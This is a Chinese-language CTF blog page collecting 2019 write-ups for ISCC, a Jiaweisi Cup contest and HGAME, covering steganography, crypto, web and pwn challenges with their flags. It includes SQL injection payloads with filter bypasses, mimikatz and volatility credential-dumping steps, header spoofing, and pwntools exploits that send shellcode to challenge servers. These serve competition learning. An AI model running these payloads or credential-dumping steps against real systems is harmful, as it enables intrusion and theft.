+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后转字符串</p>
+<h4 id="Solve-10"><a href="#Solve-10" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>) <span class="keyword">as</span> p:</span><br><span class="line">    data = p.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        data[i]=data[i].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        data[i] = data[i][:8]</span></span><br><span class="line"><span class="string">        data[i] = int(data[i],2)</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        flag += chr(int(data[i]))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrEtTy_1ScC9012_gO0d</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="他们能在一起吗？"><a href="#他们能在一起吗？" class="headerlink" title="他们能在一起吗？"></a>他们能在一起吗？</h1><h4 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h4><p>小明在网上向暗恋已久的女生表白了，对方只给小明发来了一个二维码作为回复，面对小明的求助，你会告诉他这名女生想表达的意思吗？</p>
+<h4 id="Analyze-11"><a href="#Analyze-11" class="headerlink" title="Analyze"></a>Analyze</h4><p>开局一个二维码</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5CReply.png" alt></p>
+<p>扫描后</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C17.jpg" alt></p>
+<p>解base64<code>UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=</code>得<code>PASS%7B0K_I_L0V3_Y0u%21%7D</code>转URL编码得<code>PASS{0K_I_L0V3_Y0u!}</code></p>
+<p>binwalk、foremost二连后是一个zip，密码就是`0K_I_L0V3_Y0u!``</p>
+<h4 id="Solve-11"><a href="#Solve-11" class="headerlink" title="Solve"></a>Solve</h4><p>打开文件得到flag</p>
+<h4 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;S0rrY_W3_4R3_Ju5T_Fr1END&#125;</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/03/30/第二届嘉韦思杯/">
+                第二届嘉韦思杯——我菜爆了
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-03-30</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <hr>
+<p><font size="6">第二届嘉韦思杯——神奇题名</font></p>
+<hr>
+<p><font size="6">土肥原贤二</font></p>
+<p>&emsp;&emsp;开题是一个查询界面，是查询ID=1和ID=2的两个商品，所以很容易联想到是SQL注入题，试了下好像没有什么黑名单，就是查询flag的地址，得到注入文<code>1&#39;/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3,4%23</code>返回得到flag<code>20_welcome_19</code>.<img src="http://tu1.027cgb.com/618994/1.jpg" alt></p>
+<hr>
+<p><font size="6">吴佩孚</font></p>
+<p>&emsp;&emsp;打开题目是一堆编码，base64后看形式是jsfuck编码，输入浏览器console后得到flag<code>flag{sdf465454dfgert32}</code>。<img src="http://tu1.027cgb.com/618994/2.jpg" alt></p>
+<p><img src="http://tu1.027cgb.com/618994/3.jpg" alt></p>
+<hr>
+<p><font size="6">日军空袭</font></p>
+<p>&emsp;&emsp;打开后是一堆编码，短暂尝试以后得到是一个base64然后一个url编码的循环加密。网页手动解密，得到了一个栅栏密码后的flag<code>fB__l621a4h4g_ai{&amp;i}</code>，经过栅栏密码爆破，得到是四字一栏栅栏的flag<code>flag{B64_&amp;_2hai_14i}</code></p>
+<hr>
+<p><font size="6">戴星炳</font></p>
+<p>&emsp;&emsp;题目是一道算术题，应该就是让我们用爬虫做，这里直接给exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line">url = <span class="string">'http://47.103.43.235:82/web/a/index.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">print(r.text)</span><br><span class="line">num = re.findall(re.compile(<span class="string">r'&lt;p&gt;+(.*?)&lt;/p&gt;'</span>), r.text)[<span class="number">1</span>]</span><br><span class="line">print(num)</span><br><span class="line">r = s.post(url,data=&#123;<span class="string">'result'</span>:eval(num)&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>有点投机取巧，但是也得到flag<code>flag{Y0U_4R3_3o_F4ST!}</code></p>
+<hr>
+<p><font size="6">大美晚报</font></p>
+<p>&emsp;&emsp;打开是一个二维码，另存为后方linux里binwalk，foremost二连，得到一个压缩包，爆破密码后得到flag<code>flag{d6@YX$_m^aa0}</code></p>
+<p><img src="http://tu1.027cgb.com/618994/4.jpg" alt></p>
+<p><img src="http://tu1.027cgb.com/618994/5.jpg" alt></p>
+<hr>
+<p><font size="6">晴气庆胤</font></p>
+<p>&emsp;&emsp;打开题目发了个包发现是md5碰撞题，晚上工具碰撞出两个相同的md5，url加密后发包得到flag<code>flag{MD5@_@success}</code></p>
+<p><img src="http://tu1.027cgb.com/618994/6.jpg" alt></p>
+<hr>
+<p><font size="6">冈村宁次</font></p>
+<p>&emsp;&emsp;这题考的sql注入，注入语句是<code>?id=id/*a*/anandd/*a*/extractvalue(1,concat(0x7e,(seleselectct/*a*/*/*a*/from/*a*/flag),0x7e))</code>，再转到url编码<code>?id=pkSZ3gHMskyZhxmZvoSYq8SbvJnZvoSYq8iKvoSYq8CdjR3YlxWZzVGblNHKsU2N4BDK0F2Yu92YsEDKlVHbhZHdjFmc0hXZvoSYq8CZk5WYuF2LqEmKvQWa</code>,得到flag<code>flag{s9li_1s_s0_e4sY}</code>。<img src="http://tu1.027cgb.com/618994/9.jpg" alt></p>
+<hr>
+<p><font size="6">死亡真相</font></p>
+<p>&emsp;&emsp;一个音频题，听着和一道题有点像，然后丢Audacity里用频谱图，然后看见了这一个图像</p>
+<p><img src="http://tu1.027cgb.com/618994/7.jpg" alt></p>
+<p>然后卡了半天。。。然后尝试了很多次后把’_’换成’0’后md5碰撞得到<code>hsd132456</code>，加上flag<code>flag{hsd132456}</code></p>
+<p><img src="http://tu1.027cgb.com/618994/8.jpg" alt></p>
+<hr>
+<p><font size="8">体验极差!!!!</font>前期服务器卡的一批，后期题脑洞大的一批，明天好好休息了，咕咕咕.</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/03/01/hgame-week4/">
+                Hgame--week4--菜鸡每天飞过
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-03-01</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>HGAME WRITEUP WEEK4——FzWjScJ<br>MISC<br><font size="8">0x01</font>Warmup<br>&emsp;&emsp;解压zip是一张gif图，然而并打不开……在多次烦出题人加上自己瞎倒腾之后(binwalk)知道了这是一个改了后缀的内存文件<del>（出题人真任性）</del>,然后得到了一个内存取证神器<code>mimikatz</code>，在短暂的学习文档后用了几个指令<code>log(登陆windows）</code>、<code>privilege::debug(获得权限）</code>、<code>sekurlsa::minidump 1.gif(模拟使用内存)</code>、<code>sekurlsa::logonPasswords(抓取密码)</code>,然后得到密码：<br><img src="https://i.imgur.com/wvPedIV.png" alt><br>&emsp;&emsp;再找一个加密网站加密成sha256就行，得到flag：<code>hgame{dd6dffcd56b77597157ac6c1beb514aa4c59d033098f806d88df89245824d3f5}</code>(随便吐槽一句，win10真厉害）</p>
+<hr>
+<p><font size="8">0x02</font>Clodown<br>&emsp;&emsp;解压后是2个G的mp4（大写的震惊，还以为老司机开车了），但是依旧打不开，吸取教训的我去binwalk了一波……结果跑了不知道多长时间易得又是一道内存取证题（日语草），在kali里好像有一个取证工具叫volatility,然后用<code>volatility -f memory.mp4 imageinfo</code>找到适用机型……但是并没找到，后面py出题人得到正确架构——Win7SP1x64（扫出来都是win8win10=。=）<br>&emsp;&emsp;然后开始第二步，查看SAM和System的注册表地址，输入指令<code>volatility -f memory.mp4 --profile=Win7SP1x64 hivelist</code>，找到两个地址<code>0xfffff8a003652010</code>和<code>0xfffff8a000024010</code><br><img src="https://i.imgur.com/6YItWBl.png" alt><br>&emsp;&emsp;进行查找用户密码的指令<code>volatility -f memory.mp4 --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a003652010</code>得到用户密码的哈希值：0bb8d932bbfee69fbc874214f39b1b67<br><img src="https://i.imgur.com/ZBWiAZI.png" alt><br>&emsp;&emsp;去网上找了个hash解密网站（并不会用hashcat=。=）解的密码：admin123456，再去用sha256加密一波得到flag：<code>hgame{ac0e7d037817094e9e0b4441f9bae3209d67b02fa484917065f71b16109a1a78}</code></p>
+<hr>
+<p><font size="8">0x03</font>暗藏玄机<br>&emsp;&emsp;ZIP解压后两个图片，百度了一下得知应该是盲水印然后去下了个工具试了试，得到flag：<code>hgame{h1de_in_THE_p1Cture}</code><br><img src="https://i.imgur.com/M7i3dEp.png" alt></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/15/hgame-week3/">
+                Hgame--week3--菜鸡每天飞过
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-15</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>HGAME WRITEUP WEEK3——FzWjScJ<br>&emsp;&emsp;嘤嘤嘤，这周还是没有做出pwn题，但是ak了misc……越来越菜……<br>MISC<br><font size="8">0x01</font>时至今日，你仍然是我的光芒<br>&emsp;&emsp;题目是一个zip文件，解压出来是一个mp4文件，据hint下载了一个DeEgger Embedder，打开解析出一个exe虽然不知道是什么，但是丢到winhex里看了一下!</p>
+<p><img src="https://i.imgur.com/G59hIkr.png" alt></p>
+<p>&emsp;&emsp;发现有一个JFIF文件头，就把后缀换成jpg，得到一个似曾相识的照片233</p>
+<p><img src="https://i.imgur.com/QP6G54M.png" alt></p>
+<p><img src="https://i.imgur.com/BddThIW.jpg" alt></p>
+<p>&emsp;&emsp;之后便用上了hint2，outguess，看了看官方文档，大概使用方法是</p>
+<pre><code>outguess -r 【解密图片】 -k 【密码】 -t 【输出文件名称】</code></pre><p>&emsp;&emsp;在这之后我便弯弯曲曲走了两个方法……</p>
+<p><font size="6"><em>way1：</em></font></p>
+<blockquote>
+<p>Python来写脚本爆破，脚本是写出来了，但是因为python读写本地文件太慢，差不多三四行outguess命令才进行一次读写，所以就没了附上那个无法跑出来的exp.py（但是一开始我觉得气不过，就用python命令行手动爆破了一遍，强行减慢命令执行时间，也手动爆破出来了</p>
+<p>密码：securitypassword，flag：hgame{Whataya_Want_From_Me}</p>
+</blockquote>
+<pre><code>!/usr/bin/env python
+ coding=utf-8
+
+import os
+with open(&quot;flag.txt&quot;,&quot;r&quot;) as f1:
+        with open(&quot;password.txt&quot;,&quot;r&quot;) as f2:
+            with open(&quot;useful.txt&quot;,w) as f3:
+                passwords = f2.readlines()
+                for password in passwords:
+                    password = password.strip(&quot;\n&quot;).strip(&quot;\r&quot;)
+                    print password
+                    os.popen(&quot;outguess -r flag.jpg -t flag.txt -k &quot;+ bytes(password[0]))
+                    a.read()
+                    print f1.readline()
+                    if f1.readline(5) == &apos;hgame&apos;:
+                        print &quot;Find!&quot;
+                       print f1.readline()
+                        f1.close()
+                        f2.close()
+                        break
+                    else:
+                        continue
+                print &quot;No useful Password!&quot;
+                f1.close()
+                f2.close()</code></pre><p><font size="6"><em>way2：</em></font></p>
+<blockquote>
+<p>在问过出题人后又得到了一种新的脚本书写方法，用shell写脚本，在稍短的自学shell语法后写出了此题的shell脚本</p>
+</blockquote>
+<pre><code>!/bin/bash
+  echo &quot;Begin&quot;
+  echo&quot;*******************************&quot;
+  for password in `cat $1`;
+  do       
+      outguess -r flag.jpg -k $password -t flag.txt
+      grep &quot;hgame&quot; flag.txt &gt; /dev/null
+      if [[ $? -eq 0 ]];
+     then 
+     ┊   echo &quot;**********************************&quot;
+     ┊   echo &quot;password is:$password&quot;
+     ┊   echo &quot;&quot;
+     ┊   echo &quot;flag is:`cat flag.txt`&quot;
+     ┊   echo &quot;**********************************&quot;
+     ┊   exit
+     ┊   fi
+     done</code></pre><hr>
+<p><font size="8">0x02</font>至少像那雪一样<br>&emsp;&emsp;打开题目，<del>一份色图</del>,binwlak+foremost</p>
+<p><img src="https://i.imgur.com/zbWEHQN.png" alt></p>
+<p>&emsp;&emsp;然后用WinRAR查看出来的zip文件，发现有flag.txt以及原来那张图，这里推测应该是明文攻击zip文件，这里打开Advanced Archive Password Recovery进行明文攻击，打开flag.txt但是又是啥都没有……丢进Winhex里看</p>
+<p><img src="https://i.imgur.com/c1gxZ6B.png" alt></p>
+<p>&emsp;&emsp;一开始疯狂百度，Google09，20加密，到最后貌似发现了一个什么规律，尝试把09替代成0，20替代成1，得到一串二进制数字</p>
+<pre><code>011010000110011101100001011011010110010101111011010000010111010001011111010011000110010101100001001101010111010001011111010011000011000101101011011001010101111101110100010010000110000101110100010111110111001101101110001100000111011101111101</code></pre><p>之后转成16进制代码，得到<code>6867616D657B41745F4C656135745F4C316B655F744861745F736E30777D</code>在转成str字符串，得到flag：<br><code>hgame{At_Lea5t_L1ke_tHat_sn0w}</code></p>
+<hr>
+<p><font size="8">0x03</font>旧时记忆<br>&emsp;&emsp;一道migo的脑洞题emmm，疯狂google搜图搜不到，在更新hint后得知是IBM打孔卡，对照着标准图一个个解得到flag:<code>hgame{0LD_DAY5%M3MORY}</code></p>
+<p><img src="https://i.imgur.com/6x06iiB.jpg" alt></p>
+<p><img src="https://i.imgur.com/78wjY2h.jpg" alt></p>
+<hr>
+<p><font size="8">0x04</font>听听音乐？<br>&emsp;&emsp;打卡题目是一段mp3文件，丢在Au里看看波纹<del>（最后的波纹了）</del>图，看长短应该是摩尔斯电码</p>
+<p><img src="https://i.imgur.com/amc7Vuj.png" alt></p>
+<p>记录下来为:<code>..-./.-../.-/--./---.../.----/-/..--.-/.---/..-/...../-/..--.-/....-/..--.-/./.-/.../-.--/..--.-/.--/.-/...-</code><br>翻译之后为:<code>hgame{1T_JU5T_4_EASY_WAV}</code></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/08/hgame-week2/">
+                Hgame--week2--菜鸡每天飞过
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-08</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>先给大家拜个晚晚晚晚晚年了2333，这周一周被爸妈拉着出去……没有肝题，就稍微写了一些小题摸摸鱼……<br>HGAME WRITEUP WEEK2——FzWjScJ<br>MISC<br><font size="8">0x01</font>Are You Familiar with DNS Records?<br>&emsp;&emsp;看标题是一个网址<a href="http://project-a11.club/" target="_blank" rel="noopener">http://project-a11.club/</a>，……然而并点不开。所以在网上找了找工具，DNS查询TXT类型，得到flag：hgame{seems_like_you_are_familiar_with_dns}<br><img src="https://i.imgur.com/3MVKpvN.png" alt></p>
+<hr>
+<p><font size="8">0x02</font>初识二维码<br>&emsp;&emsp;下载zip文件，打开是一个txt文本，看格式应该是要改成一个数据流形式即<code>&lt;img src=&quot;&quot;&gt;</code>，于是把数据放进双引号之间，格式改成html，得到下面的一张图：</p>
+<p><img src="https://i.imgur.com/exWBtCY.png" alt></p>
+<p>&emsp;&emsp;这是一个不完整的二维码，据MIGO的hint看了看二维码结构后，找到了下面一张图：</p>
+<p><img src="https://i.imgur.com/pdDjfIh.jpg" alt></p>
+<p>&emsp;&emsp;所以我们缺的是三个定位点和中间的连接，于是觉得画图麻烦的我打开了excel（XD；慢慢补完了二维码，扫描后得到flag：hgame{Qu1ck_ReSp0nse_cODe}</p>
+<p><img src="https://i.imgur.com/6llabDQ.png" alt></p>
+<hr>
+<p>CRYPTO<br><font size="8">0x01</font>浪漫的足球圣地<br>&emsp;&emsp;看到题目先看看足球圣地是哪，百度后得知是曼彻斯特，据我所知好像有种编码是曼彻斯特编码233，然后找到了一个工具（……太菜了不会写脚本）把题目的“966A969596A9965996999565A5A59696A5A6A59A9699A<br>599A596A595A599A569A5A99699A56996A596A696A<br>996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559”转成二进制，再进行曼彻斯特编码，再转回16进制，得到6867616D657B33663234653536373539316539636261623261376432663166373438613164347D，最后转成字符串，得到flag：hgame{3f24e567591e9cbab2a7d2f1f748a1d4}<br><font size="8">0x02</font>Vigener<br>&emsp;&emsp; 据题可得是维吉尼亚编码，网上直接又找了个工具，直接解出flag：gfyuytukxariyydfjlplwsxdbzwvqt(……本不想走上脚本小子的路但自己的确不行）</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/01/31/hgame-week1/">
+                Hgame--week1--菜鸡每天飞过
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-01-31</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>HGAME WRITEUP WEEK1——FzWjScJ<br>WEB<br><font size="8">0x01</font>换头大作战<br>&emsp;&emsp;打开<a href="http://120.78.184.111:8080/week1/how/index.php" target="_blank" rel="noopener">题目</a>是一个输入界面和一个按钮（无视我的bilibili）</p>
+<p><img src="https://i.imgur.com/lxMFbRw.png" alt></p>
+<p>&emsp;&emsp;随便输了点啥进去提交看见</p>
+<p><img src="https://i.imgur.com/ST0aLco.png" alt></p>
+<p>&emsp;&emsp;GET和POST是HTTP请求的两种基本方法，既然说POST好一点那么就POST吧233</p>
+<p>&emsp;&emsp;打开bp,发送POST请求</p>
+<p><img src="https://i.imgur.com/OqvjONF.png" alt></p>
+<p>&emsp;&emsp;看到下一步的hint，是使用localhost才可以进入下一步，使用就用X-Forwarded-For来伪造IP，在包里的内容在增加一个<code>X-Forwarded-For:127.0.0.1</code>再把cookie更改一下，把admin改成1，bp上go一波得到下一波hint</p>
+<p><img src="https://i.imgur.com/Hnq80SQ.png" alt></p>
+<p>&emsp;&emsp;看着这个是更改User_agent就把<code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</code>里的“Firefox/64.0”更改为“Waterfox/50.0”，然后再go一波</p>
+<p><img src="https://i.imgur.com/OXZPAva.png" alt></p>
+<p>&emsp;&emsp;最后是改HTTP协议里得referer，就把<code>Referer: http://120.78.184.111:8080/week1/how/index.php?want=123</code>改成b站（emmmmmmm）go一波，最后得到flag：hgame{hTTp_HeaDeR_iS_Ez}</p>
+<p><img src="https://i.imgur.com/FNsoD1g.png" alt></p>
+<hr>
+<p><font size="8">0x02</font>very easy web<br>&emsp;&emsp;打开<a href="http://120.78.184.111:8080/week1/very_ez/index.php" target="_blank" rel="noopener">题目</a>,发现是一个PHP审计题目</p>
+<p><img src="https://i.imgur.com/F9TIIDN.png" alt></p>
+<p>&emsp;&emsp;看完代码应该是发出<code>？id=vidar</code>的请求，但是看着这个加密，百度了一下，是url二次编码漏洞，也就把第一个字符url编码两次就行了，编码后的请求是<code>？id=%2576idar</code>，得到flag：hgame{urlDecode_Is_GoOd}</p>
+<p><img src="https://i.imgur.com/S4QBIcj.png" alt></p>
+<hr>
+<p><font size="8">0x03</font>can u find me?<br>&emsp;&emsp;打开<a href="http://47.107.252.171:8080/" target="_blank" rel="noopener">题目</a>,没有任何有用信息</p>
+<p><img src="https://i.imgur.com/zTBpLZ7.png" alt></p>
+<p>&emsp;&emsp;使用秘笈f12，看到一个f12.php的连接，点开</p>
+<p><img src="https://i.imgur.com/yjEBVg3.png" alt><img src="https://i.imgur.com/889RiKJ.png" alt></p>
+<p>&emsp;&emsp;找到一个提示，post密码过去，于是就打开bp抓了抓包，发现密码：<code>password: woyaoflag</code>，发送一个POST的请求</p>
+<p><img src="https://i.imgur.com/Vn3b2HG.png" alt></p>
+<p>&emsp;&emsp;得到一个连接，直接打开发现得不到flag……</p>
+<p><img src="https://i.imgur.com/G3sTjQL.png" alt></p>
+<p>&emsp;&emsp;然后打开bp，发现其实是有两个请求，第二个就跳转到上面那个界面，使用就只发送前面哪一个请求，就跳转到了flag那个界面，获得flag：hgame{f12_1s_aMazIng111}</p>
+<p><img src="https://i.imgur.com/ixddVCL.png" alt></p>
+<hr>
+<p>RE</p>
+<p><font size="8">0x01</font>brainfxxker<br>&emsp;&emsp;看题目应该就是brainfuck，下载题目是一个cpp文件，其实就是要把</p>
+<p>,&gt;++++++++++[&lt;———-&gt;-]&lt;++[+.]</p>
+<p>,&gt;+++++++++[&lt;———&gt;-]&lt;-[+.]</p>
+<p>,&gt;+++++++[&lt;——-&gt;-]&lt;—[+.]</p>
+<p>,&gt;++++++[&lt;——&gt;-]&lt;+++[+.]</p>
+<p>,&gt;++++++++[&lt;———-&gt;-]&lt;++[+.]</p>
+<p>,&gt;++++++++++[&lt;———-&gt;-]&lt;–[+.]</p>
+<p>,&gt;++++++++++[&lt;——–&gt;-]&lt;—–[+.]</p>
+<p>,&gt;++++++++++[&lt;———-&gt;-]&lt;+[+.]</p>
+<p>,&gt;+++++++++[&lt;——–&gt;-]&lt;—[+.]</p>
+<p>&emsp;&emsp;这一个brainfuck表达式在输入这9个字符后可以不输出东西，这九个字符就是Flag，然后看了一下brainfuck的基本语法</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>,</td>
+<td>输入内容到指针指向的单元（ASCⅡ码）</td>
+</tr>
+<tr>
+<td>.</td>
+<td>输出指针指向的单元内容（ASCⅡ码）</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>指针加一</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>指针减一</td>
+</tr>
+<tr>
+<td>+</td>
+<td>指针指向的字节的值加一</td>
+</tr>
+<tr>
+<td>-</td>
+<td>指针指向的字节的值减一</td>
+</tr>
+<tr>
+<td>[</td>
+<td>如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</td>
+</tr>
+<tr>
+<td>]</td>
+<td>如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;之后边开始查字符，</p>
+<p>第一个的ascii当你输入10x10-2=98,对应下来就是b时不会输出；</p>
+<p>第二个是9x9+1=82,也就是R；</p>
+<p>第三个是7x7+3=52，是字符4；</p>
+<p>第四个是6x6-3=33，是字符！；</p>
+<p>第五个是8x10-2=78，是字符N；</p>
+<p>第六个是10x10+2=102，是字符f；</p>
+<p>第七个是10x8+5=85，是字符U；</p>
+<p>第八个是10x10-1=99，是字符c；</p>
+<p>最后一个是9x8+3=75，是字符K；</p>
+<p>&emsp;&emsp;连在一起就是bR4!NfUcK,得到flag：hgame{bR4!NfUcK}</p>
+<hr>
+<p><font size="8">0x02</font>HelloRe<br>&emsp;&emsp;RE系列的签到题，下载文件后放到IDA里看看，然后调到main函数</p>
+<p><img src="https://i.imgur.com/4yxY2og.png" alt></p>
+<p>发现flag：hgame{Welc0m3_t0_R3_World!}</p>
+<hr>
+<p><font size="8">0x03</font>Pro的Python教室(一)<br>&emsp;&emsp;打开<a href="http://plqbnxx54.bkt.clouddn.com/first.py" target="_blank" rel="noopener">题目</a>是一段python程序</p>
+<p><img src="https://i.imgur.com/yV4hSko.png" alt></p>
+<p>&emsp;&emsp;然后读完程序以后发现只有第二段有一个base64加密（第三段假装加密hhhh），解密后拼起来得到flag：hgame{Here_1s_3asy_Pyth0n}</p>
+<hr>
+<p>PWN<br>&emsp;&emsp;题外话：对不起Aris的悉心教导下还是只做出来两道题……一定不放弃PWN<br><font size="8">0x01</font>babysc<br>&emsp;&emsp;题目丢进IDA里无法直接反汇编，所以在Aris教导下，找到无法反汇编那一段，把那一段的Hex改成90 90，汇编语言也就是nop，相当于把不能编译的那一段给删除掉然后再按F5反汇编，得到一个基本的逻辑伪代码</p>
+<p><img src="https://i.imgur.com/scq9Q07.png" alt></p>
+<p>&emsp;&emsp;我们可以看到之中有个加密，然后没有system，所以感觉是发送一个加密后的shellcode过去。下面是exp的代码（一开始想直接使用自带的shellcraft.sh()但是发现好像太长了，服务器那里程序会被跑崩掉，于是去网上抄了个其他的shellcode）：</p>
+<pre><code>/usr/bin/python
+-*-coding:utf-8-*-
+from pwn import *
+sh = remote(&apos;118.24.3.214&apos;,10000) 
+
+shellcode = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+shellcode = list(shellcode)
+
+for i in range(len(shellcode)):
+    shellcode[i] = u8(shellcode[i])^(i+1)
+
+for i in range(len(shellcode)):
+    shellcode[i] = p8(shellcode[i])
+
+shellcode=&quot;&quot;.join(shellcode)
+sh.send(shellcode)
+log.success(&quot;OK&quot;)</code></pre><p>&emsp;&emsp;再在虚拟机上跑一边，cat flag，得到flag：hgame{Baby_Baby_S0_E4ay!}<br><img src="https://i.imgur.com/TLGF3aM.png" alt></p>
+<hr>
+<p><font size="8">0x02</font>aaaaaaaaaa<br>&emsp;&emsp;PWN的签到题，直接用过量的’a’字符使栈覆盖System即可，以下是exp代码：</p>
+<pre><code>/usr/bin/python
+-*-coding:utf-8-*-
+from pwn import *
+sh = remote(&quot;118.24.3.214&quot;,9999)
+junk = &apos;a&apos;*0x80
+payload = junk
+sh.send(payload)
+sh.interactive()</code></pre><p>&emsp;&emsp;虚拟机上跑一遍，cat flag，得到flag：hgame{Aa4_4aA_4a4aAAA}<br><img src="https://i.imgur.com/CmwLlru.png" alt></p>
+<hr>
+<p><font size="8">0x03</font>薯片拯救世界1<br>&emsp;&emsp;这题没脚本跑出来=。=，可能真是我的打开方式不正确……但是有一个大概思路所以也就说下吧XD,<br>打开题目丢进IDA:</p>
+<p><img src="https://i.imgur.com/fruS6V5.png" alt></p>
+<p>可以看出就是要凑出来s1这个字符串，hint也说了是爆破，（但我爆破不出来……）</p>
+<hr>
+<p>MISC<br><font size="8">0x01</font>Hidden Image in LSB<br>&emsp;&emsp;开局一个压缩包，解压出一张图</p>
+<p><img src="https://i.imgur.com/pZCHdBp.png" alt></p>
+<p>（我渴望）然后审题，是LSB的图像隐写，oyeye本来想让我们写代码的，给了一个不完整的LSB的解密脚本，后面导出了stegsolve的神器，丢工具里，找到flag：hgame{LSB_is_easy_for_u}</p>
+<p><img src="https://i.imgur.com/cX5IGuu.png" alt></p>
+<hr>
+<p><font size="8">0x02</font>打字机<br>&emsp;&emsp;Aris的打字机（给我也整一个.jpg)<br>开局直接给flag和打字机的图</p>
+<p><img src="https://i.imgur.com/3kbWSMX.png" alt></p>
+<p><img src="https://i.imgur.com/x6kkVTp.png" alt></p>
+<p>&emsp;&emsp;然后就用Google识图（假装社工实际google）找到了一个对照的表，照着直接翻译</p>
+<p><img src="https://i.imgur.com/R8kNava.png" alt></p>
+<p><img src="https://i.imgur.com/EIDN9AZ.png" alt></p>
+<p>&emsp;&emsp;翻译以后得到flag：hgame{My_vi0let_tyPewRiter}</p>
+<hr>
+<p><font size="8">0x03</font>Broken Chest<br>&emsp;&emsp;开局一个ZIP,直接丢Winhex</p>
+<p><img src="https://i.imgur.com/rH4f10W.png" alt></p>
+<p>发现ZIP头不对，改成504B,顺便发现了密码在最后面：<code>S0mETh1ng_U5efuL</code>,解压成功，得到flag：hgame{Cra2y_D1aM0nd}</p>
+<p><img src="https://i.imgur.com/ZMnX2yi.png" alt></p>
+<hr>
